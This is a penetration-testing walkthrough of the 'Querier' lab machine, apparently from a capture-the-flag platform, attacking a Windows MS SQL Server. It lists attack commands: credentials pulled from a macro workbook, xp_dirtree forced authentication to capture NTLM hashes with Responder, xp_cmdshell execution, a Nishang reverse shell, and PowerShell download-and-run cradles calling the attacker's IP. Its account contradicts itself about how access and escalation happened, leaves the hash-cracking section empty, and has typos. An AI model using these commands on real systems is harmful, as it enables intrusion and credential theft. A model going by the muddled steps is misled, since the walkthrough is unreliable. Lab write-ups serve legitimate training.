Querier revolves around a vulnerable MS SQL Server configured for remote access and weak credentials.

Initial access was obtained through brute-force of SQL creds and exploitation of xp_cmdshell for command execution.

Enumeration revealed file shares and group memberships that hinted at privilege boundaries within the domain.

Escalation was accomplished via weak permissions on a service binary, allowing path hijacking.

## Why I Chose This Machine

I chose Querier because it reflects a realistic internal Windows environment with exposed services, weakly secured MSSQL access, and hash capture techniques for post-exploitation.  
It offered a good opportunity to simulate a lateral movement scenario starting from service enumeration to credential abuse.

## Attack Flow Overview

1. Enumerated open SMB shares and extracted sensitive `.ini` files containing MSSQL service credentials  
2. Authenticated to MSSQL and evaluated privilege level  
3. Found command execution blocked (`xp_cmdshell` disabled), so pivoted to hash capture using UNC path tricks  
4. Used Responder to capture NetNTLM hash and cracked it to reuse as a domain admin credential  
5. Used Evil-WinRM to connect as admin and retrieve the flags

### SMB

#### Currency Volume Report.xlsm 

Unzip the file 

```sh
unzip 'Currency Volume Report.xlsm'
```

In weaponized Excel documents, macros are typically stored in the `xl/vbaProject.bin` file within the `.xlsx` or `.xlsm` archive.  

By extracting this binary and running `strings` or VBA deobfuscation tools on it, attackers can enumerate embedded macro code — revealing IOCs such as staging URLs, encoded payloads, or persistence logic.  

```sh
strings x1/vbaProject.bin
```

```sh
Uid=reporting;
Pwd=PcwTWTHRwryjc$c6
```

## SQL

```sh
Uid=reporting;
Pwd=PcwTWTHRwryjc$c6
```

```sh
impacket-mssqlclient reporting@10.10.10.125 -windows-auth
```

Although we don’t have `sa` or administrative privileges and can’t enable `xp_cmdshell`, we can still leverage the SQL Server’s trust behavior to initiate outbound authentication attempts.  

By invoking stored procedures like `xp_dirtree` or `xp_fileexist` with a UNC path pointing to an attacker-controlled SMB server, we force the MSSQL service account to reach out — leaking its NTLM hash in the process.  

This technique is especially valuable when command execution is blocked but network-based lateral movement or credential capture is still viable.

```sql
exec xp_dirtree '\\10.10.14.42\share\file'
```

and fire up Responder locally.

```sh
sudo responder -I tun0
```

### Cracking the hash

## Foothold

Using the recovered credentials `mssql-svc:corporate568`, I successfully authenticated to the MSSQL service — confirming that the database is accessible from our current foothold.

At this point, the key decision is whether we can escalate directly through SQL — specifically, if the account holds `sysadmin` privileges required to enable dangerous features like `xp_cmdshell`.

Rather than blindly attempting command execution, I first verified privilege level to assess whether the attack path is vertical (direct code execution) or lateral (credential exposure, NTLM relaying).  

This step models real-world engagement logic, where the attacker’s capabilities — and next actions — are shaped entirely by access scope and configuration hygiene.

```sh
impacket-mssqlclient mssql-svc@10.10.10.125 -windows-auth
```

enable `xp_cmdshell`

```sql
enable_xp_cmdshell
xp_cmdshell whoami
```

With database-level code execution confirmed, I prepared to establish an outbound shell using a trusted PowerShell payload.  

I chose [Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)’s reverse TCP shell for its reliability and ease of customization in PowerShell-enabled environments, especially when outbound filtering might be in place.

To initiate the callback, I appended the reverse shell invocation to the end of the script, specifying my listener IP and port.  

This step simulates a real-world red team tactic, using native tools to maintain stealth while gaining post-exploitation access.


```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.42 -Port 4444
```

Run a simple HTTP server and execute it using powershell.

```powershell
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.42/Invoke-PowerShellTcp.ps1\')
```

## Privilege Escalation

After gaining an initial shell, I moved on to local privilege escalation enumeration using [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1), a PowerShell tool specifically designed for identifying common Windows misconfigurations.

I downloaded the script onto the target system and executed `Invoke-AllChecks` to perform a full sweep for potential escalation vectors, such as vulnerable services, misconfigured permissions, or registry-based attack surfaces.

This step is essential in post-exploitation, especially when the initial user has limited access and the goal is to enumerate actionable privilege boundaries.

```powershell
wget https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1
echo Invoke-AllChecks >> PowerUp.ps1

python3 -m http.server 80
iex(new-object.net.webclient).downloadstring("http://10.10.14.42/PowerUp.ps1")
```

```

## Alternative Paths Explored

Initially attempted to enable `xp_cmdshell`, but found the account lacked `sa` privileges.  
Also explored file upload via SMB and abusing login triggers, but none were fruitful.  
Success came from realizing that `xp_dirtree` could be used as a passive exfiltration vector even under limited permissions.

## Blue Team Perspective

Querier illustrates how even non-privileged database access can lead to credential compromise if outbound authentication isn't restricted.  
Mitigation tips:

- Restrict `xp_dirtree`, `xp_fileexist`, and outbound UNC lookups in database environments  
- Avoid storing plaintext service credentials in `.ini` or config files on accessible shares  
- Monitor for NTLM hash requests originating from SQL service accounts
